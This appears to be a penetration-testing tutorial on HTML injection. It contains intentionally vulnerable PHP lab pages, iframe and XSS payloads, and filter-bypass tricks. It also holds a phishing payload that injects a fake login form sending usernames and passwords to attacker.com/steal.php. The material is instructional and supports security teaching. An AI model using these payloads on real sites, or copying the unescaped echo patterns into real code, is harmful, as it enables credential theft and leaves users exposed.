
# 🛡️ HTML Injection Vulnerability

## 🔍 What is HTML Injection?

**HTML Injection** is a web vulnerability that occurs when an application embeds user input directly into the **HTML structure** of a webpage **without proper sanitization or encoding**.

This allows attackers to **inject arbitrary HTML tags or content**, which the browser will interpret and render as part of the page.

---

## ⚙️ How Does HTML Injection Happen?

HTML Injection occurs when a web application:

* Takes **untrusted user input** (e.g., from query parameters, form fields, or headers).
* Inserts it into the **HTML output** without encoding **special HTML characters**.

---

## ⚠️ Example of Vulnerable Code

```php
<?php
if (isset($_REQUEST['user'])) {
    echo "<h2>" . $_REQUEST['user'] . "</h2>";
}
?>
```

### 💥 Exploit Example:

```url
http://192.168.129.145/webpentest/html-injection.php?user=<iframe src='http://malicious.com'></iframe>
```

---

## 💥 Consequences of HTML Injection

* 🎨 **Page Defacement** – Modify the look and feel of the site
* 🎣 **Phishing** – Fake login forms or popups
* 🧠 **User Manipulation** – Trick users with misleading or fake content
* 🎯 **Browser Exploitation** – Trigger browser-specific bugs or redirection

---

## 💣 Common Attack Scenarios

| Context        | Example Payload                                            | Impact                                |
| -------------- | ---------------------------------------------------------- | ------------------------------------- |
| GET/POST input | `?user=<h1>Hacked</h1>`                                    | Injects fake headers                  |
| Form Field     | `<input name='name' value="<?php echo $_GET['name']; ?>">` | Breaks HTML rendering                 |
| URL Params     | `<iframe src="<?php echo $_GET['uri']; ?>"></iframe>`      | Loads malicious site                  |
| HTTP Headers   | `User-Agent: <img src=x onerror=alert(1)>`                 | Executes JavaScript (XSS-like attack) |

---

## ❗ Why Is HTML Injection Dangerous?

* 🔐 **Trust Exploitation** – Hijacks trust in legitimate web content
* 🕵️‍♂️ **Credential Theft** – Harvests usernames/passwords via phishing
* 🧬 **DOM Manipulation** – Modifies structure or logic of the page
* 🧨 **Script Execution** – Often a stepping stone to XSS

---

## ✅ Prevention Techniques

* 🔒 **Sanitize User Input**
  Strip or encode characters like `<`, `>`, `"`, `'`, etc.

* 🧼 **Context-Aware Encoding**
  Use functions like:

  ```php
  htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
  ```

* ✅ **Whitelist Valid Inputs**
  Accept only predefined/safe values in forms and URLs

* 🚫 **Avoid Direct Insertion**
  Never insert raw user input directly into HTML, attributes, or script sections

---
## 🔗 References (Updated + Verified)

* 🧪 [OWASP WSTG: Testing for HTML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
* 🧠 [HTML Character Reference – W3C](https://dev.w3.org/html5/html-author/charref)
* 📘 [University of Miami – HTML Character Reference](https://rabbit.eng.miami.edu/info/htmlchars.html)
---
---

## 📋 Basic Login Form Exmple

> Convert to one line for exploitation
```html
<h1>Please Login</h1>
<form action="login.php" method="POST">
    User Name: <input type="text" name="username"><br />
    Password: <input type="password" name="password"><br />
    <input type="submit" value="Login">
</form>
```

---

## 🧪 Vulnerable Example 1 — `html-injection.php`

```php
html-injection.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection</title>
</head>
<body>
    <h1>HTML Injection</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        echo "<h2>" . $_REQUEST['user'] . "</h2>";
    }
    ?>
</body>
</html>
```

### 💥 Exploit Example:
> 1. Test Inject
```php
?user=<h1>Injected!</h1>
```
```php
http://192.168.129.145/webpentest/html-injection.php?user=<h1>Injected!</h1>
```
> 2. Iframe Inject
```php
?user=<iframe src="https://www.armourinfosec.com" width="100%" height="500"></iframe><!--
```
```php
http://192.168.129.145/webpentest/html-injection.php?user=<iframe src="https://www.armourinfosec.com" width="100%" height="500"></iframe><!--
```
> The Injected text is rendered as HTML.
---

## 🧪 Vulnerable Example 2 — `html-injection2.php`

```php
html-injection2.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection 2</title>
</head>
<body>
    <h1>Please Login</h1>
    <form action="#" method="POST">
        <!-- Vulnerable to HTML Injection -->
        <input type="hidden" name="sessionid" value="<?php echo $_REQUEST['sessionid']; ?>">
        Username: <input type="text" name="username"><br />
        Password: <input type="password" name="password"><br />
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

### 💥 Exploit Example:
> 1. Test Inject
```php
?sessionid=test
```
```php
http://192.168.129.145/webpentest/html-injection2.php?sessionid=test
```
> 2. Login Form Inject Orignal Form hide and Injected Form Show.
```php
?sessionid="></h1><form action="http://attacker.com/steal.php" method="POST"><input type="text" name="username" placeholder="Username"><br><input type="password" name="password" placeholder="Password"><br><input type="submit" value="Login"></form><!--
```
```php
http://192.168.129.145/webpentest/html-injection2.php?sessionid="></h1><form action="http://attacker.com/steal.php" method="POST"><input type="text" name="username" placeholder="Username"><br><input type="password" name="password" placeholder="Password"><br><input type="submit" value="Login"></form><!--
```
> Check = F12 -> Elements -> Console OR BURP SUITE -> Repeater -> Response
```url
http://192.168.129.145/webpentest/html-injection2.php?sessionid="><h1>Injected</h1><!--
```
> The input escapes the attribute context and injects HTML.
---

## 🧪 Vulnerable Example 3 — `html-injection3.php`
```php
html-injection3.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection 3</title>
</head>
<body>
    <?php
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $user_ipadd = $_SERVER['REMOTE_ADDR'];
    $user_port_no = $_SERVER['REMOTE_PORT'];
    $user_ipadd2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : '';
    $user_ipadd3 = isset($_SERVER['HTTP_X_PROXYUSER_IP']) ? $_SERVER['HTTP_X_PROXYUSER_IP'] : '';
    $user_http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    ?>

    <h2>User Info</h2>
    <table border="1">
        <tr>
            <th>User Agent</th>
            <th>User IP Address</th>
            <th>Port Number</th>
            <th>HTTP Referer</th>
        </tr>
        <tr>
            <td><?php echo htmlspecialchars($user_agent); ?></td>
            <td><?php echo htmlspecialchars($user_ipadd); ?></td>
            <td><?php echo htmlspecialchars($user_port_no); ?></td>
            <td><?php echo htmlspecialchars($user_http_referer); ?></td>
        </tr>
    </table>

    <br>
    <strong>Forwarded IP:</strong> <?php echo htmlspecialchars($user_ipadd2); ?><br>
    <strong>Proxy User IP:</strong> <?php echo htmlspecialchars($user_ipadd3); ?>
</body>
</html>
```

### 💥 Exploit Example:

> Open Burp Suite -> Request tab Change User Agent Value Change -> Send -> Check and Refresh Page
```url
http://192.168.129.145/webpentest/html-injection3.php
```
---
---
# 🔴 HTML Injection — Blacklist (GET & POST)
## 🚫 1. Blacklist-Based Filtering (GET Method)
```php
html-injection-black-list-get.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - GET</title>
</head>
<body>
    <h1>HTML Injection Blacklist - GET</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']); // Removes < and >
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```
### 💥 Exploit:
> <h1>Nikhi<h2>
- Step-1 [HTML entity encoder/decoder](https://mothereff.in/html-entities)
> Copy Entity Encode = &#x3C;h1&#x3E;Nikhi&#x3C;h2&#x3E;
- Step-2 [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
> Copy Encode = %26%23x3C%3Bh1%26%23x3E%3BNikhi%26%23x3C%3Bh2%26%23x3E%3B

```url
http://192.168.129.145/webpentest/html-injection-black-list-get.php?user=%26lt%3Bh1%26gt%3BNikhil%26lt%3B/h1%26gt%3B
```
### Output
```
<h1>Nikhil</h1>!!
```
---

## 🚫 2. Blacklist-Based Filtering (POST Method)

```php
html-injection-black-list-post.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - POST</title>
</head>
<body>
    <h1>HTML Injection Blacklist - POST</h1>
    <form action="html-injection-black-list-post.php" method="POST">
        User Name: <input type="text" name="user"><br>
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
<h1>Hello!</h1>
```

```php
<img src=x onerror=alert('XSS')>
```

### 🛠️ Bypass Technique:

> Use HTML entities:

```php
&lt;img src=x onerror=alert(1)&gt;
```

> ⚠️ **Encoding evasion** — Blacklists are easy to bypass using encoded characters or alternative syntax.

---

# 🔴 HTML Injection — Whitelist

 ## ⚠️ 1. **html-injection-white-list.php — Still Vulnerable**

**Below is your provided code, updated only for layout consistency and readability. The HTML injection vulnerability remains because the regex does not fully validate input (it only checks if at least one allowed character is present anywhere in the input), so injection is still possible.**

```php
html-injection-white-list.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Whitelist</title>
</head>
<body>
    <h1>HTML Injection Whitelist</h1>
    <form action="html-injection-white-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

       // This Regex only checks for the presence of at least one allowed character.
       // Inputs with both allowed and unallowed characters will still pass through.
        if (!preg_match('/[a-z\d_\-\.]/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
          // No Sanitization or escaping still vulnerable to HTML Injection!   
            echo "<h2>" . $user_name . "!!</h2>";
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
<h1>Injected</h1>
```

> ✅ Passes because characters like `h`, `1`, `I`, etc., are in the allowed set.

### 🛠️ Bypass Technique:

```php
a<script>alert(1)</script>
```

**Vulnerability explanation:**

* The regular expression `/[a-z\d_\-\.]/i` will match as long as there is at least one allowed character in the input, not that the entire input is only allowed characters.
* Input like `<h1>Injected</h1>` will pass the check because letters like h, i, n, etc. are part of the allowed set.
* No output escaping is done before echoing the value in the `<h2>` tag, so HTML code in the input is rendered.
* Thus, an attacker can still inject arbitrary HTML into the output.

> ⚠️ The regex only *checks if input contains* allowed characters — it doesn’t reject bad ones **outside** the list.

---

## 🔥 2. `html-injection-white-list2.php` — Completely Vulnerable

**Below is your provided code, updated for whitespace, indentation, and readability only.
The vulnerability is preserved.
The regular expression used does NOT fully validate that the entire input contains only allowed characters, so HTML injection remains possible.**

```php
html-injection-white-list2.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 2</title>
</head>
<body>
    <h1>Html Injection White List - 2</h1>
    <form action="html-injection-white-list2.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // ❌ Weak Regex: This regex only checks if the first character is allowed.
        // Any subsequent characters can be anything, so input like "<h1>Injection" will still pass.
        if (preg_match('/^[a-z\d_\.\-]/i', $user_name)) {
            echo '<h2>' . $user_name . '!</h2>'; // No sanitization
        } else {
          // No output sanitization: This is still Vulnerable to HTML Injection!
            die("Don't try to Inject Code");
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
a<script>alert('XSS')</script>
```

* The regular expression `/^[a-z\d_\.\-]/i` only checks whether the **first character** is in the allowed list (`a-z`, `0–9`, `_`, `.`, or `-`).
* Any characters AFTER the first can be anything — including HTML tags or other injection payloads.
* Example: `A<script>alert(1)</script>` will pass the check.
* The value is printed directly inside `<h2>` without encoding or sanitization.
* An attacker can submit a payload that starts with an allowed character and inject arbitrary HTML into the page — maintaining the vulnerability as requested.

> ⚠️ Only one matching character (e.g., `a`) is enough for input to be accepted. Full injection follows.

---

## 🛡️3. `html-injection-white-list3.php` — Improved, But Still Risky

**The vulnerability is preserved.**
However, this version uses a stricter regular expression, which only allows letters, digits, dot, dash, and underscore throughout the whole input (`/^[a-z\d\.\-\_]*$/i`).
So basic HTML injection via angle brackets (`<` and `>`) is blocked,
but it is still important to note that the code does not perform output encoding or escaping.

```php
html-injection-white-list3.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 3</title>
</head>
<body>
    <h1>Html Injection White List - 3</h1>
    <form action="html-injection-white-list3.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // This Regex only allows a-z, 0-9, dot, dash, and underscore, any length (including empty string)
        if (!preg_match('/^[a-z\d\.\-\_]*$/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
           // No output sanitization: Printing directly in HTML context.       
            echo "<h2>" . $user_name . "!</h2>";
        }
    }
    ?>
</body>
</html>
```

### 💥 Exploit:

```php
admin_user-12
```

**Vulnerability Analysis**

* Only these characters are accepted: `a-z`, `A-Z`, `0–9`, `.`, `_`, `-`
* No output encoding:
  The code echoes `$user_name` directly inside an HTML element.

**Potential risk:**

* Angle brackets are not allowed, so basic HTML injection using tags like `<script>` or `<img>` is blocked.
* Other forms of injection (like JavaScript event attributes or Unicode tricks) are also mostly prevented due to character restrictions.
* If the allowed character set is later expanded, or additional vectors are possible depending on browser or context, risk may still exist.

---


